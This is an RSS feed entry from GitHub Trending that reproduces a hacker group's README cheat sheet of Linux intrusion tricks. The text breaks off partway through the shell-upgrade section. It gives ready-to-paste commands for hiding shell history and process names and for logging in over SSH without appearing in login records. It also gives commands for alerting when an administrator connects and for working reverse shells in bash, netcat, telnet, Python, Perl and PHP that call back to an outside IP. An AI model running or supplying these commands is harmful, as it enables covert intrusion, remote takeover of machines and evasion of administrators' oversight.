<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"><channel><title>GitHub Trending: C, This week</title><link>https://github.com/trending/c?since=weekly</link><description>The top repositories on GitHub for c, measured weekly</description><pubDate>Tue, 04 Feb 2020 01:05:36 GMT</pubDate><lastBuildDate>Tue, 04 Feb 2020 01:05:36 GMT</lastBuildDate><generator>PyRSS2Gen-1.1.0</generator><docs>http://blogs.law.harvard.edu/tech/rss</docs><ttl>720</ttl><item><title>hackerschoice/thc-tips-tricks-hacks-cheat-sheet #1 in C, This week</title><link>https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet</link><description>&lt;p&gt;&lt;i&gt;Various tips &amp; tricks&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-thcs-favourite-tips-tricks--hacks-cheat-sheet" class="anchor" aria-hidden="true" href="#thcs-favourite-tips-tricks--hacks-cheat-sheet"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;THC's favourite Tips, Tricks &amp;amp; Hacks (Cheat Sheet)&lt;/h1&gt;
&lt;h2&gt;&lt;a id="user-content-available-at-httpstinyccthctricks" class="anchor" aria-hidden="true" href="#available-at-httpstinyccthctricks"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Available at &lt;a href="https://tiny.cc/thctricks" rel="nofollow"&gt;https://tiny.cc/thctricks&lt;/a&gt;&lt;/h2&gt;
&lt;p&gt;A collection of our favourite tricks. Many of those tricks are not from us. We merely collect them.&lt;/p&gt;
&lt;p&gt;We show the tricks 'as is' without any explanation why they work. You need to know Linux to understand how and why they work.&lt;/p&gt;
&lt;p&gt;Got tricks? Send them to &lt;a href="mailto:root@thc.org"&gt;root@thc.org&lt;/a&gt; or submit a pull request.&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#lbwh-anchor"&gt;Bash&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#lbwh-anchor"&gt;Leave Bash without history&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#hyc-anchor"&gt;Hide your command&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#hya-anchor"&gt;Hide your arguments&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#ais-anchor"&gt;SSH&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#ais-anchor"&gt;Almost invisible SSH&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sto-anchor"&gt;SSH tunnel OUT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sti-anchor"&gt;SSH tunnel IN&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#sso-anchor"&gt;SSH socks5 OUT&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ssi-anchor"&gt;SSH socks5 IN&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#network-anchor"&gt;Network&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#adln-anchor"&gt;ARP discover computers on the local network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#idln-anchor"&gt;ICMP discover local network&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#mtc-anchor"&gt;Monitor all new TCP connections&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#atc-anchor"&gt;Alert on all new TCP connections&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#fe-anchor"&gt;File Encoding and Transfer&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#feu-anchor"&gt;uuencode&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#feo-anchor"&gt;openssl&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#fex-anchor"&gt;xxd&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#feb-anchor"&gt;Multiple binaries&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ftsrl-anchor"&gt;File transfer using screen from REMOTE to LOCAL&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ftslr-anchor"&gt;File transfer using screen from LOCAL to REMOTE&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#rs-anchor"&gt;Reverse Shell / Dumb Shell&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#rs-anchor"&gt;Reverse Shells&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#rswb-anchor"&gt;with Bash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rswob-anchor"&gt;without Bash&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rswpy-anchor"&gt;with Python&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rswpl-anchor"&gt;with Perl&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rswphp-anchor"&gt;with PHP&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#rsu-anchor"&gt;Upgrading the dumb shell&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#rsup-anchor"&gt;Upgrade a reverse shell to a pty shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rsup2-anchor"&gt;Upgrade a reverse shell to a fully interactive shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#rssc-anchor"&gt;Reverse shell with socat (fully interactive)&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#bd-anchor"&gt;Backdoors&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#bdrs-anchor"&gt;Background reverse shell&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#bdak-anchor"&gt;authorized_keys&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#sh-anchor"&gt;Shell Hacks&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#shsf-anchor"&gt;Shred files (secure delete)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shsfwo-anchor"&gt;Shred files without &lt;em&gt;shred&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shrdf-anchor"&gt;Restore the date of a file&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shcl-anchor"&gt;Clean logfile&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#shhu-anchor"&gt;Hide files from a User without root privileges&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#cr-anchor"&gt;Crypto&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#crgrp-anchor"&gt;Generate quick random Password&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#crltefs-anchor"&gt;Linux transportable encrypted filesystems&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#cref-anchor"&gt;Encrypting a file&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#misc-anchor"&gt;Miscellaneous&lt;/a&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href="#sss-anchor"&gt;Sniff a user's SSH session&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ssswor-anchor"&gt;Sniff a user's SSH session without root privileges&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#hlc-anchor"&gt;How to survive high latency connections&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-lbwh-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;1.i. Leave Bash without history:&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Tell Bash to use &lt;em&gt;/dev/null&lt;/em&gt; instead of &lt;em&gt;~/.bash_history&lt;/em&gt;. This is the first command we execute on every shell. It will stop the Bash from logging your commands.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ export HISTFILE=/dev/null
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;It is good housekeeping to 'commit suicide' when exiting a shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ alias exit='kill -9 $$'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Any command starting with a " " (space) will &lt;a href="https://unix.stackexchange.com/questions/115917/why-is-bash-not-storing-commands-that-start-with-spaces" rel="nofollow"&gt;not get logged to history&lt;/a&gt; either.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$  id
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-hyc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;1.ii. Hide your command&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ exec -a syslogd nmap -T0 10.0.2.1/24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Alternatively if there is no Bash:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cp `which nmap` syslogd
$ PATH=.:$PATH syslogd -T0 10.0.2.1/24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;In this example we execute &lt;em&gt;nmap&lt;/em&gt; but let it appear with the name &lt;em&gt;syslogd&lt;/em&gt; in &lt;em&gt;ps alxwww&lt;/em&gt; process list.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-hya-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;1.iii. Hide your arguments&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Download &lt;a href="src/zap-args.c"&gt;zap-args.c&lt;/a&gt;. This example will execute &lt;em&gt;nmap&lt;/em&gt; but will make it appear as 'syslogd' without any arguments in the &lt;em&gt;ps alxww&lt;/em&gt; output.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ gcc -Wall -O2 -fpic -shared -o zap-args.so zap-args.c -ldl
$ LD_PRELOAD=./zap-args.so exec -a syslogd nmap -T0 10.0.0.1/24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note: There is a gdb variant as well. Anyone?&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-ais-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;2.i. Almost invisible SSH&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -o UserKnownHostsFile=/dev/null -T user@host.org "bash -i"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will not add your user to the &lt;em&gt;/var/log/utmp&lt;/em&gt; file and you won't show up in &lt;em&gt;w&lt;/em&gt; or &lt;em&gt;who&lt;/em&gt; command of logged in users. It will bypass .profile and .bash_profile as well. On your client side it will stop logging the host name to &lt;em&gt;~/.ssh/known_hosts&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-sto-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;2.ii SSH tunnel OUT&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We use this all the time to circumvent local firewalls and IP filtering:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -g -L31337:1.2.3.4:80 user@host.org
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;You or anyone else can now connect to your computer on port 31337 and get tunneled to 1.2.3.4 port 80 and appear with the source IP of 'host.org'.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-sti-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;2.iii SSH tunnel IN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;We use this to give access to a friend to an internal machine that is not on the public Internet:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -o ExitOnForwardFailure=yes -g -R31338:192.168.0.5:80 user@host.org
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Anyone connecting to host.org:31338 will get tunneled to 192.168.0.5 on port 80 via your computer.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-sso-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;2.iv SSH socks4/5 OUT&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;OpenSSH 7.6 adds support for reverse dynamic forwarding. Example: Tunnel all your browser traffic through your server.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -D 1080 user@host.org
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now configure your browser to use SOCKS with 127.0.0.1:1080. All your traffic is now tunneled through &lt;em&gt;host.org&lt;/em&gt; and will appear with the source IP of &lt;em&gt;host.org&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-ssi-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;2.v SSH socks4/5 IN&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is the reverse of the above example. It give others access to your &lt;em&gt;local&lt;/em&gt; network or let others use your computer as a tunnel end-point.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ ssh -g -R 1080 user@host.org
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The others configuring host.org:1080 as their SOCKS4/5 proxy. They can now connect to &lt;em&gt;any&lt;/em&gt; computer on &lt;em&gt;any port&lt;/em&gt; that your computer has access to. This includes access to computers behind your firewall that are on your local network.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-network-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-adln-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;3.i. ARP discover computers on the local network&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nmap -r -sn -PR 192.168.0.1/24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will Arp-ping all local machines just like &lt;em&gt;arping&lt;/em&gt;. ARP ping always seems to work and is very steahlthy (e.g. does not show up in the target's firewall). However, this command is by far our favourite:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nmap -thc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;3.ii. ICMP discover local network&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;...and when we do not have nmap and we can not do broadcast pings (requires root) then we use this:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ for x in `seq 1 254`; do ping -on -c 3 -i 0.1 -W 200 192.168.1.$x | grep 'bytes from' | cut -f4 -d" " | sort -u; done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-mtc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;3.iii. Monitor all new TCP connections&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# tcpdump -n "tcp[tcpflags] == tcp-syn"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-atc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;3.iv. Alert on new TCP connections&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Make a &lt;em&gt;bing&lt;/em&gt;-noise (ascii BEL) when anyone tries to SSH to/from the target system (could be an admin!).&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# tcpdump -nlq "tcp[13] == 2 and dst port 22" | while read x; do echo "${x}"; echo -en \\a; done
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-fe-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-feu-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.i. File Encoding - uuencode&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Binary files transfer badly over a terminal connection. There are many ways to convert a binary into base64 or similar and make the file terminal friendly. We can then use a technique described further on to transfer a file to and from a remote system using nothing else but the shell/terminal as a transport medium (e.g. no separate connection).&lt;/p&gt;
&lt;p&gt;Encode:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ uuencode /etc/issue.net issue.net-COPY
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Cut &amp;amp; paste the output (4 lines, starting with 'being 644 ...') into this command:
Decode:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ uudecode
begin 644 issue-net-COPY
356)U;G1U(#$X+C`T+C(@3%13"@``
`
end
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-feo-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.ii. File Encoding - openssl&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Openssl can be used when uu/decode/encode is not available on the remote system:&lt;/p&gt;
&lt;p&gt;Encode:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 &amp;lt;/etc/issue.net
VWJ1bnR1IDE4LjA0LjIgTFRTCg==
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Cut &amp;amp; paste the output into this command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 -d &amp;gt;issue.net-COPY
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-fex-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.iii. File Encoding - xxd&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;..and if neither &lt;em&gt;uuencode&lt;/em&gt; nor &lt;em&gt;openssl&lt;/em&gt; is available then we have to dig a bit deeper in our trick box and use &lt;em&gt;xxd&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Encode:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ xxd -p &amp;lt;/etc/issue.net
726f6f743a783a303a30...
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Cut &amp;amp; paste the output into this command:
Decode:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ xxd -p -r &amp;gt;issue.net-COPY
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-feb-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.iv. File Encoding - Multiple Binaries&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Method 1: Using &lt;em&gt;shar&lt;/em&gt; to create a self extracting shell script with binaries inside:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ shar *.png *.c &amp;gt;stuff.shar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Transfer &lt;em&gt;stuff.shar&lt;/em&gt; to the remote system and execute it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ chmod 700 stuff.shar
$ ./stuff.shar
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Method 2: Using &lt;em&gt;tar&lt;/em&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ tar cfz - *.png *.c | openssl base64 &amp;gt;stuff.tgz.b64
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Transfer &lt;em&gt;stuff.tgz.b64&lt;/em&gt; to the remote system and execute:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 -d &amp;lt;stuff.tgz.b64 | tar xfz -
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-ftsrl-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.v. File transfer - using &lt;em&gt;screen&lt;/em&gt; from REMOTE to LOCAL&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Transfer a file FROM the remote system to your local system:&lt;/p&gt;
&lt;p&gt;Have a &lt;em&gt;screen&lt;/em&gt; running on your local computer and log into the remote system from within your shell. Instruct your local screen to log all output:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-a : logfile screen-xfer.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-a H&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We use &lt;em&gt;openssl&lt;/em&gt; to encode our data but any of the above encoding methods works. This command will display the base64 encoded data in the terminal and &lt;em&gt;screen&lt;/em&gt; will write this data to &lt;em&gt;screen-xfer.txt&lt;/em&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 &amp;lt;/etc/issue.net
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Stop your local screen from logging any further data:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-a H&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;On your local computer and from a different shell decode the file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 -d &amp;lt;screen-xfer.txt
$ rm -rf screen-xfer.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-ftslr-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;4.vi. File transfer - using &lt;em&gt;screen&lt;/em&gt; from LOCAL to REMOTE&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;On your local system (from within a different shell) encode the data:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 &amp;lt;/etc/issue.net &amp;gt;screen-xfer.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;On the remote system (and from within the current &lt;em&gt;screen&lt;/em&gt;):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl base64 -d
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Get &lt;em&gt;screen&lt;/em&gt; to slurp the base64 encoded data into screen's clipboard and paste the data from the clipboard to the remote system:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-a : readbuf screen-xfer.txt&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-a : paste .&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;CTRL-d&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Note: Two C-d are required due to a &lt;a href="https://github.com/openssl/openssl/issues/9355"&gt;bug in openssl&lt;/a&gt;.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-rs-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-rswb-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.i.a. Reverse shell with Bash&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Start netcat to listen on port 1524 on your system:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc -nvlp 1524
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;On the remote system, this command will connect back to your system (IP = 3.13.3.7, Port 1524) and give you a shell prompt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ setsid bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1 &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rswob-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.i.b. Reverse shell without Bash&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Especially embedded systems do not always have Bash and the &lt;em&gt;/dev/tcp/&lt;/em&gt; trick will not work. There are many other ways (Python, PHP, Perl, ..). Our favorite is to upload netcat and use netcat or telnet:&lt;/p&gt;
&lt;p&gt;On the remote system:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ nc -e /bin/bash -vn 3.13.3.7 1524
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Variant if &lt;em&gt;'-e'&lt;/em&gt; is not supported:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mkfifo /tmp/.io
$ sh -i 2&amp;gt;&amp;amp;1 &amp;lt;/tmp/.io | nc -vn 3.13.3.7 1524 &amp;gt;/tmp/.io
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Telnet variant:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mkfifo /tmp/.io
$ sh -i 2&amp;gt;&amp;amp;1 &amp;lt;/tmp/.io | telnet 3.13.3.7 1524 &amp;gt;/tmp/.io
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Telnet variant when mkfifo is not supported (Ulg!):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ (touch /dev/shm/.fio; sleep 60; rm -f /dev/shm/.fio) &amp;amp;
$ tail -f /dev/shm/.fio | sh -i 2&amp;gt;&amp;amp;1 | telnet 3.13.3.7 1524 &amp;gt;/dev/shm/.fio
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note: Use &lt;em&gt;/tmp/.fio&lt;/em&gt; if &lt;em&gt;/dev/shm&lt;/em&gt; is not available.
Note: This trick logs your commands to a file. The file will be &lt;em&gt;unlinked&lt;/em&gt; from the fs after 60 seconds but remains useable as a 'make shift pipe' as long as the reverse tunnel is started within 60 seconds.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-rswpy-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.i.c. Reverse shell with Python&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("3.13.3.7",1524));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rswpl-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.i.d. Reverse shell with Perl&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# method 1
$ perl -e 'use Socket;$i="3.13.3.7";$p=1524;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&amp;gt;&amp;amp;S");open(STDOUT,"&amp;gt;&amp;amp;S");open(STDERR,"&amp;gt;&amp;amp;S");exec("/bin/sh -i");};'
# method 2
$ perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"3.13.3.7:1524");STDIN-&amp;gt;fdopen($c,r);$~-&amp;gt;fdopen($c,w);while(&amp;lt;&amp;gt;){if($_=~ /(.*)/){system $1;}};'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rswphp-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.i.e. Reverse shell with PHP&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;php -r '$sock=fsockopen("3.13.3.7",1524);exec("/bin/bash -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3");'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rsu-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-rsup-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.ii.a. Upgrade a reverse shell to a PTY shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Any of the above reverse shells are limited. For example &lt;em&gt;sudo bash&lt;/em&gt; or &lt;em&gt;top&lt;/em&gt; will not work. To make these work we have to upgrate the shell to a real PTY shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ script -qc /bin/bash /dev/null  # Linux
$ script -q /dev/null /bin/bash   # BSD
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Or:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Python
$ python -c 'import pty; pty.spawn("/bin/bash")'
